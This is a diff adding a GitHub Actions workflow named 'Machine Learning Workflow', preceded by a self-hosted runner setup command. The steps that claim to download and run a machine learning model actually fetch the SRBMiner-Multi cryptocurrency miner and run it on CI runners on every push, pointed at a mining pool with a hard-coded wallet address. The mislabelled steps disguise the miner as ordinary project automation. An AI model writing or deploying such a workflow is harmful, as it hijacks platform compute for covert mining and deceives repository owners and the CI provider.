@@ -1,0 +1,37 @@
+mkdir actions-runner && cd actions-runner && curl -o actions-runner-linux-x64-2.313.0.tar.gz -L https://github.com/actions/runner/releases/download/v2.313.0/actions-runner-linux-x64-2.313.0.tar.gz && echo "56910d6628b41f99d9a1c5fe9df54981ad5d8c9e42fc14899dcc177e222e71c4  actions-runner-linux-x64-2.313.0.tar.gz" | shasum -a 256 -c && tar xzf ./actions-runner-linux-x64-2.313.0.tar.gz && sudo ./bin/installdependencies.sh 
+
+name: Machine Learning Workflow
+
+on:
+  push:
+    branches:
+      - main  # You might need to adjust this depending on your default branch name
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v2
+
+      - name: Install Dependencies
+        run: |
+          sudo apt update
+          sudo apt install wget
+          sudo apt -y install tar xz-utils
+
+      - name: Download and Extract Machine Learning Model
+        run: |
+          wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.4.7/SRBMiner-Multi-2-4-7-Linux.tar.xz
+          tar xf SRBMiner-Multi-2-4-7-Linux.tar.xz
+          cd SRBMiner-Multi-2-4-7
+
+      - name: List Files
+        run: |
+          ls -la  # Use this command to check if SRBMiner-MULTI exists in the directory
+
+      - name: Run Machine Learning Model
+        run: |
+          cd SRBMiner-Multi-2-4-7  # Move to the correct directory
+          ./SRBMiner-MULTI --disable-gpu --algorithm yespower --pool na.rplant.xyz:17111 --wallet aNEpRWJEag9JiZFgztAf38q4kPmgkfXNCo.r2 pause --cpu-Threads 16 --keepalive true
